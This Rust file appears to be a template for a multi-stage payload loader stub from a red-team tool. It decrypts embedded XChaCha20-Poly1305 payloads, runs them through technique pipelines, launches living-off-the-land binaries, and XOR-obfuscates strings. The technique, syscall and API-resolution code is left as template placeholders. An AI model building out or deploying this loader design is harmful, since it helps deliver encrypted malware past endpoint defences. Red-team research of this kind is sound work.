//! Stub generated automatically by picaro (multi-stage).
//!
//! Runs an ordered chain of stages. Each `technique` stage decrypts an embedded
//! payload with XChaCha20-Poly1305 and runs it with its own technique pipeline;
//! each `exec` stage launches a process (a living-off-the-land binary or any
//! command); each `sleep` stage waits. Part of a red team research tool; not
//! code for malicious use.

use chacha20poly1305::{
    aead::{Aead, KeyInit},
    XChaCha20Poly1305, Key, XNonce,
};

// --- String obfuscation helper (used by the injected string defs) ---
#[inline(never)]
#[allow(dead_code)]
fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let mut out = bytes.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % 32];
    }
    out
}

/// Decrypts one stage's payload, verifying the Poly1305 tag and the size.
fn decrypt_stage(enc: &[u8], nonce_hex: &str, key_hex: &str, len: usize) -> Result<Vec<u8>, String> {
    let nonce_vec = hex::decode(nonce_hex).map_err(|e| format!("invalid nonce: {e}"))?;
    let nonce: [u8; 24] = nonce_vec
        .try_into()
        .map_err(|_| "the nonce must be 24 bytes".to_string())?;
    let key_vec = hex::decode(key_hex).map_err(|e| format!("invalid key: {e}"))?;
    let key: [u8; 32] = key_vec
        .try_into()
        .map_err(|_| "the key must be 32 bytes".to_string())?;
    let cipher = XChaCha20Poly1305::new(Key::from_slice(&key));
    let image = cipher
        .decrypt(XNonce::from_slice(&nonce), enc)
        .map_err(|_| "decryption failed: wrong key/nonce or tampered payload".to_string())?;
    if image.len() != len {
        return Err("decrypted payload size does not match the expected size".to_string());
    }
    Ok(image)
}

fn main() {
    match run() {
        Ok(code) => std::process::exit(code),
        Err(msg) => {
            eprintln!("{msg}");
            std::process::exit(1);
        }
    }
}

fn run() -> Result<i32, String> {
    init_syscalls()?;
    #[allow(unused_mut, unused_assignments)]
    let mut last: i32 = 0;
$STAGE_RUNNER_BODY$
    Ok(last)
}

// --- Stage modules (injected: per-stage technique pipelines and exec launchers) ---
$STAGE_MODULES$

// --- Syscall layer (injected; no-op unless build.stub.syscalls is set) ---
$SYSCALLS_BLOCK$

// --- Payload arguments (injected; shared by the execution techniques) ---
$ARGS_BLOCK$

// --- Payload import resolution (injected; shared by the execution techniques) ---
$IMPORTS_BLOCK$

// --- API resolution proxies (injected; from build.stub.api_resolution) ---
$API_RESOLUTION_BLOCK$
